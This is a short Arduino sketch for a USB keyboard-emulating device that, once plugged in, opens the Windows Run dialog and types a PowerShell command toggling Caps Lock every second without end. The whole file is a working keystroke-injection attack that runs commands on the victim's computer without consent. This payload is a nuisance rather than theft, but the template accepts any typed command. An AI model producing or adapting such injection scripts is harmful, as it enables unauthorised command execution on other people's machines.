#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("powershell -c \"Add-Type -AssemblyName System.Windows.Forms; while(1){Start-Sleep 1; [Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}')}\""));
}

void loop() {}
